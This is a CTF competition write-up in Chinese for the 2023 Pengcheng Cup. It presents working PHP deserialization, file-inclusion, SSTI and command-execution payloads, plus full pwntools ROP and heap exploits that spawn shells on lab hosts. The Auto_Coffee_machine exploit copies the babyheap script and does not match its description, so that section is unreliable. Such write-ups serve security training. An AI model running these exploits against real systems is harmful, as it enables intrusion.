# 2023鹏程杯初赛Writeup

> 原文: https://www.ctfiot.com/143076.html
> ID: 143076

WEB

Web-web1

代码如下

<?php
show_source(__FILE__);
error_reporting(0);
class Hacker{
    private $exp;
    private $cmd;

    public  function __toString()
    {
        call_user_func('system', "cat /flag");
    }
}

class A
{
    public $hacker;
    public  function __toString()
    {
        echo $this->hacker->name;
        return "";
    }
}
class C
{
    public $finish;
    public function __get($value)
    {
        $this->finish->hacker();
        echo 'nonono';
    }
}
class E
{
    public $hacker;

    public  function __invoke($parms1)
    {   
        echo $parms1;
        $this->hacker->welcome();
    }
}

class H
{
    public $username="admin";
    public function __destruct()
    {
        $this->welcome();

    }
    public  function welcome()
    {
        echo "welcome~ ".$this->username;
    }
}

class K
{
    public $func;
    public function __call($method,$args)
    {
        call_user_func($this->func,'welcome');
    }
}

class R
{
    private $method;
    private $args;

    public  function welcome()
    {
        if ($this->key === true && $this->finish1->name) {
            if ($this->finish->finish) {
                call_user_func_array($this->method,$this->args);
            }
        }
    }
}

function nonono($a){
    $filter = "/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i";
    return preg_replace($filter,'',$a);
}

$a = $_POST["pop"];
if (isset($a)){
    unserialize(nonono($a));
}
?>

很简单，指定一下路由即可，贴上exp

POP链子

new H()->__destruct()->new Hacker()->__destruct()->echo->__toString->call_user_func(‘system’, “cat /flag”);

<?php
show_source(__FILE__);
error_reporting(0);
class Hacker{
//    private $exp;
//    private $cmd;
//
//    public  function __toString()
//    {
//        call_user_func('system', "cat /flag");
//    }
}

class A
{
    public $hacker;
    public  function __toString()
    {
        echo $this->hacker->name;
        return "";
    }
}
class C
{
    public $finish;
    public function __get($value)
    {
        $this->finish->hacker();
        echo 'nonono';
    }
}
class E
{
    public $hacker;

    public  function __invoke($parms1)
    {
        echo $parms1;
        $this->hacker->welcome();
    }
}

class H
{
    public $username="admin";
    public function __construct(){
        $this->username = new Hacker();
    }

    public function __destruct()
    {
        $this->welcome();

    }
    public  function welcome()
    {
        echo "welcome~ ".$this->username;
    }
}

class K
{
    public $func;
    public function __call($method,$args)
    {
        call_user_func($this->func,'welcome');
    }
}

class R
{
    private $method;
    private $args;

    public  function welcome()
    {
        if ($this->key === true && $this->finish1->name) {
            if ($this->finish->finish) {
                call_user_func_array($this->method,$this->args);
            }
        }
    }
}

function nonono($a){
    $filter = "/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i";
    return preg_replace($filter,'',$a);
}
$a = new H();
echo serialize($a);

//$a = $_POST["pop"];
//if (isset($a)){
//    unserialize(nonono($a));
//}
?>

Web-HTTP

Spring Boot信息泄露 netdoc协议文件包含

开局一个网站，经过分析是SpringBoot框架，上工具扫描 SpringScan.exe

找到一个敏感接口，进行访问 /swagger-ui/index.html

点击得到一个api-docs路由文件

{"openapi":"3.0.3","info":{"title":"Challenge","description":"Proxy API","version":"1.0"},"servers":[{"url":"http://172.10.0.3:8080","description":"Inferred Url"}],"tags":[{"name":"Proxy","description":"Proxy Controller"}],"paths":{"/proxy/url":{"get":{"tags":["Proxy"],"summary":"proxy for the url which submitted by user","operationId":"proxyUsingGET","parameters":[{"name":"url","in":"query","description":"url","required":false,"style":"form","schema":{"type":"string"}}],"responses":{"200":{"description":"OK","content":{"*/*":{"schema":{"type":"string","format":"byte"}}}},"401":{"description":"Unauthorized"},"403":{"description":"Forbidden"},"404":{"description":"Not Found"}}}}},"components":{}}

继续测试，发现是存在文件包含的，exp如下

/proxy/url?url=url:file:///flag%23.html  # 截断绕过
/proxy/url?url=url:netdoc:///flag%23.html

Web-Tera

描述：Tera teraa teraaa

emm，看了很久这题，Tera -> Rust SSTI

打开题目环境

传参 raw data值

附上exp，直接跑就行

import string
import requests
import time

url = "http://172.10.0.3:8081/"
str = string.hexdigits + "-+,"
zhi = "^fla.."

def fuck(p):
    data = """{% set t="galf"|reverse %}{% set f=get_env(name=t,default="123") %}{% if f is matching('canshu.*') %}aaaaa{% endif %}
    """.replace("canshu",p)
    resp = requests.post(url,data=data)
    if "aaaaa" in resp.text:
        return True
    return False

while True:
    for i in str:
        if fuck(zhi + i):
            zhi += i
            print(zhi)
            break
        if i == "+":
            break

最终flag：3c8ce067-4df7-66b2-843a-04c695904159

Web-web2

打开环境

源代码有一处提示

利用glob协议写一个脚本爆破得到后面

import requests
import string

url = "http://172.10.0.5/"
str = "abcdefghijklmnopqrstuvwxyz0123456789."

path = "/var/www/html/backdoor_"

for i in range(100):
    for s in str:
        data = {
            "filename": f"glob://{path + s}*"
        }
        resp = requests.post(url=url, data=data)
        # print(res.text)
        if "yesyesyes" in resp.text:
            path += s
            print(path)
            break

访问得到源码

<?php
highlight_file(__FILE__);
error_reporting(0);

if(isset($_GET['username'])){
    $sandbox = '/var/www/html/sandbox/'.md5("5050f6511ffb64e1914be4ca8b9d585c".$_GET['username']).'/';
    mkdir($sandbox);
    chdir($sandbox);
    
    if(isset($_GET['title'])&&isset($_GET['data'])){
        $data = $_GET['data'];
        $title= $_GET['title'];
        if (strlen($data)>5||strlen($title)>3){
            die("no!no!no!");
        }
        file_put_contents($sandbox.$title,$data);

        if (strlen(file_get_contents($title)) <= 10) {
            system('php '.$sandbox.$title);
        }
        else{
            system('rm '.$sandbox.$title);
            die("no!no!no!");
        }

    }
    else if (isset($_GET['reset'])) {
        system('/bin/rm -rf ' . $sandbox);
    }
}

构造payload绕过获取flag

backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=admin&title[]=2.php&data[]=<?=`tac%20/f*`;

PWN

Pwn-silent

开了沙盒，禁止了execve函数，所以我们只能orw

代码审计

非常明显的栈溢出，但是程序没有输出函数，我们可以利用magic gadget来使得stdout改写为libc中gadget syscall;ret;

然后利用libc_csu_init和read的返回数控制前三个参数和rax的值

exp：

from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc-2.27.so")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name,env={"LD_PRELOAD":"./libc-2.27.so"})
    p = remote("172.10.0.8",9999)
    elf = ELF(name)

pop_rdi = 0x0000000000400963
start = 0x400720
csu_1 = 0x00000000040095A
'''
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]
add     rbx, 1
cmp     rbp, rbx
'''    
csu_2 = 0x000000000400940
'''
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''

get_p("./silent")
bss = 0x602100
magic = 0x00000000004007e8
leave_ret = 0x0000000000400876
stdout = 0x000000000601020
op = 0xffffffffffffffff & (0x00000000000d2625-libc.sym['_IO_2_1_stdout_'])
syscall = p64(csu_1) + p64(op) + p64(stdout+0x3d) + p64(1) + p64(0) + p64(0) + p64(0) + p64(magic)
payload = b"A"*0x48 + p64(csu_1) + p64(0) + p64(1) + p64(elf.got['read']) + p64(0) + p64(bss-8) + p64(0x200) + p64(csu_2)
payload += p64(bss-8)*3 + p64(0)*4 + p64(leave_ret)

p.send(payload)

sleep(0.2)

payload = b"/flagx00x00x00" + syscall

payload += p64(csu_1) + p64(0) + p64(1) + p64(elf.got['read']) + p64(0) + p64(bss+0x300) + p64(0x200) + p64(csu_2)
payload += p64(0) + p64(0) + p64(1) + p64(stdout) + p64(bss-8) + p64(0) + p64(0) + p64(csu_2)
payload += p64(0)*2 + p64(1) + p64(elf.got['read']) + p64(3) + p64(bss+0x400) + p64(0x200) + p64(csu_2)
payload += p64(0)*2 + p64(1) + p64(elf.got['read']) + p64(0) + p64(bss+0x300) + p64(0x200) + p64(csu_2)
payload += p64(0)*2 + p64(1) + p64(stdout) + p64(1) + p64(bss+0x400) + p64(0x40) + p64(csu_2)

p.send(payload)
sleep(0.2)

p.send("x00"*2)
sleep(0.2)
# gdb.attach(p,"")
# sleep(2)
p.send("x00")
p.interactive()

Pwn-Auto_Coffee_machine

代码审计

漏洞点在admin的chang_default函数这，没有先对原来的left_coffee进行复制到copy_left_coffee，以至于我们可以利用free过的东西

思路就是我们先用admin的rep函数，将left_coffee复制到copy_left_coffee上，然后对left_coffee进行free的操作，然后就可以就可以利用UAF进行got表劫持，再利用同样的操作就可以使得coffee_list改为我们泄露的libc的地址

exp

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name, env={"LD_PRELOAD":"./libc.so.6"})
    p = remote("172.10.0.7",10001)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter(">> ",'1')
    p.sendlineafter("input your name size",str(size))
    p.sendafter("input your name",content)
def edit(idx,content):
    p.sendlineafter(">> ",'2')
    p.sendlineafter("input index",str(idx))
    p.sendlineafter("input your name size",str(len(content)))
    p.sendlineafter("input your name",content)

def show(idx):
    p.sendlineafter(">> ",'3')
    p.sendlineafter("input index",str(idx))

def dele(idx):
    p.sendlineafter(">> ",'4')
    p.sendlineafter("input index",str(idx))

get_p("./babyheap")
p.recvuntil("0x")
heap_base = int(p.recv(12),16) - 0x2a0
print(hex(heap_base))
ptr = heap_base+0x2c0
add(0x408,p64(heap_base + 0x7b0)+b"A"*0x3ff+b'n')
add(0x4f8,"A"*0x4f8+'n')
add(0x408,"A"*0x407+'n')
add(0x4f8,"A"*0x4f7+'n')
add(0x408,"A"*0x407+'n')

edit(2,b"A"*0x400 + p64(0x410*2))
edit(1,b"A"*0xe0+p64(0)+p64(0x410*2+1)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0)+p64(0))

dele(3)
add(0x408,"A"*0x407+"n")

show(2)
add(0x408,"A"*0x407+"n")
add(0x4f8,"A"+"n")

for i in range(7):
    add(0x408,"A"*0x407+"n")

for i in range(7):
    dele(7+i)

dele(5)
add(0x4f0,"An")    
show(2)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x1ff0f0

print(hex(libc.address))
for i in range(8):
    add(0x408,"A"*0x407+"n")

dele(0)
dele(7+7)
edit(2,p64(libc.sym['_IO_2_1_stdout_']^(heap_base+0x2a0>>12))[:6])
add(0x408,"An")
add(0x408,p64(0xFBAD1800)+p64(0)*3+p64(libc.sym['environ']) + p64(libc.sym['environ']+8)+b"n")

stack = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00"))
print(hex(stack))
target = stack - 0x128 - 0x40
# edit(5,p64(0xFBAD1800)+p64(0)*3+p64(libc.sym['environ'])[-6:])

dele(4)
dele(0)
ret = 0x0000000000026a3e + libc.address
pop_rdi = 0x0000000000028715 + libc.address
system  = libc.sym['system']
one_gadget = 0x110612 + libc.address
binsh = next(libc.search(b"/bin/sh"))
edit(2,p64(target^(heap_base+0x4e0>>12)))

# p.sendlineafter(">> ",'1')
add(0x408,"An")
# gdb.attach(p,"b *$rebase(0x000000000001572)")
# sleep(2)
add(0x408,p64(0)+p64(one_gadget)+b" 0"*0x200+b"n")
p.interactive()

Pwn-babyheap

代码审计

add和edit函数有off_by_null

我们利用unlink来进行堆重叠，然后进行泄露libc，这里远程需要将unsorted chunk加入进large bin来进行绕过x00截停

然后可以利用FSOP，这里可以利用多次，我选择泄露栈地址，进行ROP

exp

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name, env={"LD_PRELOAD":"./libc.so.6"})
    p = remote("172.10.0.7",10001)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter(">> ",'1')
    p.sendlineafter("input your name size",str(size))
    p.sendafter("input your name",content)
def edit(idx,content):
    p.sendlineafter(">> ",'2')
    p.sendlineafter("input index",str(idx))
    p.sendlineafter("input your name size",str(len(content)))
    p.sendlineafter("input your name",content)

def show(idx):
    p.sendlineafter(">> ",'3')
    p.sendlineafter("input index",str(idx))

def dele(idx):
    p.sendlineafter(">> ",'4')
    p.sendlineafter("input index",str(idx))

get_p("./babyheap")
p.recvuntil("0x")
heap_base = int(p.recv(12),16) - 0x2a0
print(hex(heap_base))
ptr = heap_base+0x2c0
add(0x408,p64(heap_base + 0x7b0)+b"A"*0x3ff+b'n')
add(0x4f8,"A"*0x4f8+'n')
add(0x408,"A"*0x407+'n')
add(0x4f8,"A"*0x4f7+'n')
add(0x408,"A"*0x407+'n')

edit(2,b"A"*0x400 + p64(0x410*2))
edit(1,b"A"*0xe0+p64(0)+p64(0x410*2+1)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0)+p64(0))

dele(3)
add(0x408,"A"*0x407+"n")

show(2)
add(0x408,"A"*0x407+"n")
add(0x4f8,"A"+"n")

for i in range(7):
    add(0x408,"A"*0x407+"n")

for i in range(7):
    dele(7+i)

dele(5)
add(0x4f0,"An")    
show(2)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x1ff0f0

print(hex(libc.address))
for i in range(8):
    add(0x408,"A"*0x407+"n")

dele(0)
dele(7+7)
edit(2,p64(libc.sym['_IO_2_1_stdout_']^(heap_base+0x2a0>>12))[:6])
add(0x408,"An")
add(0x408,p64(0xFBAD1800)+p64(0)*3+p64(libc.sym['environ']) + p64(libc.sym['environ']+8)+b"n")

stack = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00"))
print(hex(stack))
target = stack - 0x128 - 0x40
# edit(5,p64(0xFBAD1800)+p64(0)*3+p64(libc.sym['environ'])[-6:])

dele(4)
dele(0)
ret = 0x0000000000026a3e + libc.address
pop_rdi = 0x0000000000028715 + libc.address
system  = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))
edit(2,p64(target^(heap_base+0x4e0>>12)))

# p.sendlineafter(">> ",'1')
add(0x408,"An")
# gdb.attach(p,"b *$rebase(0x000000000001572)")
# sleep(2)
add(0x408,p64(0)+p64(ret)+p64(pop_rdi)+p64(binsh) + p64(system)+b"n")
p.interactive()

RE

bad_pe

观察PE文件，看到有很多0x23数据，不太对劲。

尝试将整个文件的十六进制异或23

找到正确的PE文件

修复完成bad_pe文件，开始分析，直接进入main函数

动调找密文

解密

def KSA(key):
    key_length = len(key)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]
    return S

def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        yield K
        
def RC4(key):
    S = KSA(key)
    keystream = PRGA(S)
    return keystream

if __name__ == '__main__':
    key = 'th3k3y!'
    plaintext = [
        0xBD, 0xF0, 0x4C, 0xD9, 0xD0, 0x29, 0xF2, 0x46,
        0x08, 0xCC, 0xC8, 0x9F, 0xBE, 0x4B, 0xEF, 0x67, 
        0x46, 0x04, 0xE6, 0x32, 0xF3, 0xF6, 0xAA, 0xF0, 
        0xD1, 0xD8, 0xEC, 0x75, 0x49, 0x2F, 0xCC, 0x26, 
        0x2E, 0x7E, 0x63
    ]
    key = key.encode()
    keystream = RC4(key)

    ciphertext = []
    for b in plaintext:
        ciphertext.append(chr(b ^ next(keystream)))
    print("".join(ciphertext))

得到flag

flag{th3_p3fi15_1s_v3ry_nicccccc!}

安全编程

直接使用linux远程调试，可以看到程序流程为判断100次输入与程序随机生成的值，必须100次都正确，程序会自动解密encflag.png文件，生成img.png

因为是用rust语言写的，静态分析很乱，直接使用动态调试

有两个关键点

一个是判断输入与程序随机生成的值是否想到

一个是判断正确次数是否到了100次


```
<?php
show_source(__FILE__);
error_reporting(0);
class Hacker{
    private $exp;
    private $cmd;

    public  function __toString()
    {
        call_user_func('system', "cat /flag");
    }
}

class A
{
    public $hacker;
    public  function __toString()
    {
        echo $this->hacker->name;
        return "";
    }
}
class C
{
    public $finish;
    public function __get($value)
    {
        $this->finish->hacker();
        echo 'nonono';
    }
}
class E
{
    public $hacker;

    public  function __invoke($parms1)
    {   
        echo $parms1;
        $this->hacker->welcome();
    }
}

class H
{
    public $username="admin";
    public function __destruct()
    {
        $this->welcome();

    }
    public  function welcome()
    {
        echo "welcome~ ".$this->username;
    }
}

class K
{
    public $func;
    public function __call($method,$args)
    {
        call_user_func($this->func,'welcome');
    }
}

class R
{
    private $method;
    private $args;

    public  function welcome()
    {
        if ($this->key === true && $this->finish1->name) {
            if ($this->finish->finish) {
                call_user_func_array($this->method,$this->args);
            }
        }
    }
}

function nonono($a){
    $filter = "/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i";
    return preg_replace($filter,'',$a);
}

$a = $_POST["pop"];
if (isset($a)){
    unserialize(nonono($a));
}
?>
```



```
POP链子
```



```
<?php
show_source(__FILE__);
error_reporting(0);
class Hacker{
//    private $exp;
//    private $cmd;
//
//    public  function __toString()
//    {
//        call_user_func('system', "cat /flag");
//    }
}

class A
{
    public $hacker;
    public  function __toString()
    {
        echo $this->hacker->name;
        return "";
    }
}
class C
{
    public $finish;
    public function __get($value)
    {
        $this->finish->hacker();
        echo 'nonono';
    }
}
class E
{
    public $hacker;

    public  function __invoke($parms1)
    {
        echo $parms1;
        $this->hacker->welcome();
    }
}

class H
{
    public $username="admin";
    public function __construct(){
        $this->username = new Hacker();
    }

    public function __destruct()
    {
        $this->welcome();

    }
    public  function welcome()
    {
        echo "welcome~ ".$this->username;
    }
}

class K
{
    public $func;
    public function __call($method,$args)
    {
        call_user_func($this->func,'welcome');
    }
}

class R
{
    private $method;
    private $args;

    public  function welcome()
    {
        if ($this->key === true && $this->finish1->name) {
            if ($this->finish->finish) {
                call_user_func_array($this->method,$this->args);
            }
        }
    }
}

function nonono($a){
    $filter = "/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i";
    return preg_replace($filter,'',$a);
}
$a = new H();
echo serialize($a);

//$a = $_POST["pop"];
//if (isset($a)){
//    unserialize(nonono($a));
//}
?>
```



```
Spring Boot信息泄露 netdoc协议文件包含
```



```
{"openapi":"3.0.3","info":{"title":"Challenge","description":"Proxy API","version":"1.0"},"servers":[{"url":"http://172.10.0.3:8080","description":"Inferred Url"}],"tags":[{"name":"Proxy","description":"Proxy Controller"}],"paths":{"/proxy/url":{"get":{"tags":["Proxy"],"summary":"proxy for the url which submitted by user","operationId":"proxyUsingGET","parameters":[{"name":"url","in":"query","description":"url","required":false,"style":"form","schema":{"type":"string"}}],"responses":{"200":{"description":"OK","content":{"*/*":{"schema":{"type":"string","format":"byte"}}}},"401":{"description":"Unauthorized"},"403":{"description":"Forbidden"},"404":{"description":"Not Found"}}}}},"components":{}}
```



```
/proxy/url?url=url:file:///flag%23.html  # 截断绕过
/proxy/url?url=url:netdoc:///flag%23.html
```



```
import string
import requests
import time

url = "http://172.10.0.3:8081/"
str = string.hexdigits + "-+,"
zhi = "^fla.."

def fuck(p):
    data = """{% set t="galf"|reverse %}{% set f=get_env(name=t,default="123") %}{% if f is matching('canshu.*') %}aaaaa{% endif %}
    """.replace("canshu",p)
    resp = requests.post(url,data=data)
    if "aaaaa" in resp.text:
        return True
    return False

while True:
    for i in str:
        if fuck(zhi + i):
            zhi += i
            print(zhi)
            break
        if i == "+":
            break
```



```
import requests
import string

url = "http://172.10.0.5/"
str = "abcdefghijklmnopqrstuvwxyz0123456789."

path = "/var/www/html/backdoor_"

for i in range(100):
    for s in str:
        data = {
            "filename": f"glob://{path + s}*"
        }
        resp = requests.post(url=url, data=data)
        # print(res.text)
        if "yesyesyes" in resp.text:
            path += s
            print(path)
            break
```



```
<?php
highlight_file(__FILE__);
error_reporting(0);

if(isset($_GET['username'])){
    $sandbox = '/var/www/html/sandbox/'.md5("5050f6511ffb64e1914be4ca8b9d585c".$_GET['username']).'/';
    mkdir($sandbox);
    chdir($sandbox);
    
    if(isset($_GET['title'])&&isset($_GET['data'])){
        $data = $_GET['data'];
        $title= $_GET['title'];
        if (strlen($data)>5||strlen($title)>3){
            die("no!no!no!");
        }
        file_put_contents($sandbox.$title,$data);

        if (strlen(file_get_contents($title)) <= 10) {
            system('php '.$sandbox.$title);
        }
        else{
            system('rm '.$sandbox.$title);
            die("no!no!no!");
        }

    }
    else if (isset($_GET['reset'])) {
        system('/bin/rm -rf ' . $sandbox);
    }
}
```



```
backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=admin&title[]=2.php&data[]=<?=`tac%20/f*`;
```



```
from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc-2.27.so")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name,env={"LD_PRELOAD":"./libc-2.27.so"})
    p = remote("172.10.0.8",9999)
    elf = ELF(name)

pop_rdi = 0x0000000000400963
start = 0x400720
csu_1 = 0x00000000040095A
'''
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]
add     rbx, 1
cmp     rbp, rbx
'''    
csu_2 = 0x000000000400940
'''
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''

get_p("./silent")
bss = 0x602100
magic = 0x00000000004007e8
leave_ret = 0x0000000000400876
stdout = 0x000000000601020
op = 0xffffffffffffffff & (0x00000000000d2625-libc.sym['_IO_2_1_stdout_'])
syscall = p64(csu_1) + p64(op) + p64(stdout+0x3d) + p64(1) + p64(0) + p64(0) + p64(0) + p64(magic)
payload = b"A"*0x48 + p64(csu_1) + p64(0) + p64(1) + p64(elf.got['read']) + p64(0) + p64(bss-8) + p64(0x200) + p64(csu_2)
payload += p64(bss-8)*3 + p64(0)*4 + p64(leave_ret)

p.send(payload)

sleep(0.2)

payload = b"/flagx00x00x00" + syscall

payload += p64(csu_1) + p64(0) + p64(1) + p64(elf.got['read']) + p64(0) + p64(bss+0x300) + p64(0x200) + p64(csu_2)
payload += p64(0) + p64(0) + p64(1) + p64(stdout) + p64(bss-8) + p64(0) + p64(0) + p64(csu_2)
payload += p64(0)*2 + p64(1) + p64(elf.got['read']) + p64(3) + p64(bss+0x400) + p64(0x200) + p64(csu_2)
payload += p64(0)*2 + p64(1) + p64(elf.got['read']) + p64(0) + p64(bss+0x300) + p64(0x200) + p64(csu_2)
payload += p64(0)*2 + p64(1) + p64(stdout) + p64(1) + p64(bss+0x400) + p64(0x40) + p64(csu_2)

p.send(payload)
sleep(0.2)

p.send("x00"*2)
sleep(0.2)
# gdb.attach(p,"")
# sleep(2)
p.send("x00")
p.interactive()
```



```
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name, env={"LD_PRELOAD":"./libc.so.6"})
    p = remote("172.10.0.7",10001)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter(">> ",'1')
    p.sendlineafter("input your name size",str(size))
    p.sendafter("input your name",content)
def edit(idx,content):
    p.sendlineafter(">> ",'2')
    p.sendlineafter("input index",str(idx))
    p.sendlineafter("input your name size",str(len(content)))
    p.sendlineafter("input your name",content)

def show(idx):
    p.sendlineafter(">> ",'3')
    p.sendlineafter("input index",str(idx))

def dele(idx):
    p.sendlineafter(">> ",'4')
    p.sendlineafter("input index",str(idx))

get_p("./babyheap")
p.recvuntil("0x")
heap_base = int(p.recv(12),16) - 0x2a0
print(hex(heap_base))
ptr = heap_base+0x2c0
add(0x408,p64(heap_base + 0x7b0)+b"A"*0x3ff+b'n')
add(0x4f8,"A"*0x4f8+'n')
add(0x408,"A"*0x407+'n')
add(0x4f8,"A"*0x4f7+'n')
add(0x408,"A"*0x407+'n')

edit(2,b"A"*0x400 + p64(0x410*2))
edit(1,b"A"*0xe0+p64(0)+p64(0x410*2+1)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0)+p64(0))

dele(3)
add(0x408,"A"*0x407+"n")

show(2)
add(0x408,"A"*0x407+"n")
add(0x4f8,"A"+"n")

for i in range(7):
    add(0x408,"A"*0x407+"n")

for i in range(7):
    dele(7+i)

dele(5)
add(0x4f0,"An")    
show(2)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x1ff0f0

print(hex(libc.address))
for i in range(8):
    add(0x408,"A"*0x407+"n")

dele(0)
dele(7+7)
edit(2,p64(libc.sym['_IO_2_1_stdout_']^(heap_base+0x2a0>>12))[:6])
add(0x408,"An")
add(0x408,p64(0xFBAD1800)+p64(0)*3+p64(libc.sym['environ']) + p64(libc.sym['environ']+8)+b"n")

stack = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00"))
print(hex(stack))
target = stack - 0x128 - 0x40
# edit(5,p64(0xFBAD1800)+p64(0)*3+p64(libc.sym['environ'])[-6:])

dele(4)
dele(0)
ret = 0x0000000000026a3e + libc.address
pop_rdi = 0x0000000000028715 + libc.address
system  = libc.sym['system']
one_gadget = 0x110612 + libc.address
binsh = next(libc.search(b"/bin/sh"))
edit(2,p64(target^(heap_base+0x4e0>>12)))

# p.sendlineafter(">> ",'1')
add(0x408,"An")
# gdb.attach(p,"b *$rebase(0x000000000001572)")
# sleep(2)
add(0x408,p64(0)+p64(one_gadget)+b" 0"*0x200+b"n")
p.interactive()
```



```
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name, env={"LD_PRELOAD":"./libc.so.6"})
    p = remote("172.10.0.7",10001)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter(">> ",'1')
    p.sendlineafter("input your name size",str(size))
    p.sendafter("input your name",content)
def edit(idx,content):
    p.sendlineafter(">> ",'2')
    p.sendlineafter("input index",str(idx))
    p.sendlineafter("input your name size",str(len(content)))
    p.sendlineafter("input your name",content)

def show(idx):
    p.sendlineafter(">> ",'3')
    p.sendlineafter("input index",str(idx))

def dele(idx):
    p.sendlineafter(">> ",'4')
    p.sendlineafter("input index",str(idx))

get_p("./babyheap")
p.recvuntil("0x")
heap_base = int(p.recv(12),16) - 0x2a0
print(hex(heap_base))
ptr = heap_base+0x2c0
add(0x408,p64(heap_base + 0x7b0)+b"A"*0x3ff+b'n')
add(0x4f8,"A"*0x4f8+'n')
add(0x408,"A"*0x407+'n')
add(0x4f8,"A"*0x4f7+'n')
add(0x408,"A"*0x407+'n')

edit(2,b"A"*0x400 + p64(0x410*2))
edit(1,b"A"*0xe0+p64(0)+p64(0x410*2+1)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0)+p64(0))

dele(3)
add(0x408,"A"*0x407+"n")

show(2)
add(0x408,"A"*0x407+"n")
add(0x4f8,"A"+"n")

for i in range(7):
    add(0x408,"A"*0x407+"n")

for i in range(7):
    dele(7+i)

dele(5)
add(0x4f0,"An")    
show(2)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x1ff0f0

print(hex(libc.address))
for i in range(8):
    add(0x408,"A"*0x407+"n")

dele(0)
dele(7+7)
edit(2,p64(libc.sym['_IO_2_1_stdout_']^(heap_base+0x2a0>>12))[:6])
add(0x408,"An")
add(0x408,p64(0xFBAD1800)+p64(0)*3+p64(libc.sym['environ']) + p64(libc.sym['environ']+8)+b"n")

stack = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00"))
print(hex(stack))
target = stack - 0x128 - 0x40
# edit(5,p64(0xFBAD1800)+p64(0)*3+p64(libc.sym['environ'])[-6:])

dele(4)
dele(0)
ret = 0x0000000000026a3e + libc.address
pop_rdi = 0x0000000000028715 + libc.address
system  = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))
edit(2,p64(target^(heap_base+0x4e0>>12)))

# p.sendlineafter(">> ",'1')
add(0x408,"An")
# gdb.attach(p,"b *$rebase(0x000000000001572)")
# sleep(2)
add(0x408,p64(0)+p64(ret)+p64(pop_rdi)+p64(binsh) + p64(system)+b"n")
p.interactive()
```



```
def KSA(key):
    key_length = len(key)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]
    return S

def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        yield K
        
def RC4(key):
    S = KSA(key)
    keystream = PRGA(S)
    return keystream

if __name__ == '__main__':
    key = 'th3k3y!'
    plaintext = [
        0xBD, 0xF0, 0x4C, 0xD9, 0xD0, 0x29, 0xF2, 0x46,
        0x08, 0xCC, 0xC8, 0x9F, 0xBE, 0x4B, 0xEF, 0x67, 
        0x46, 0x04, 0xE6, 0x32, 0xF3, 0xF6, 0xAA, 0xF0, 
        0xD1, 0xD8, 0xEC, 0x75, 0x49, 0x2F, 0xCC, 0x26, 
        0x2E, 0x7E, 0x63
    ]
    key = key.encode()
    keystream = RC4(key)

    ciphertext = []
    for b in plaintext:
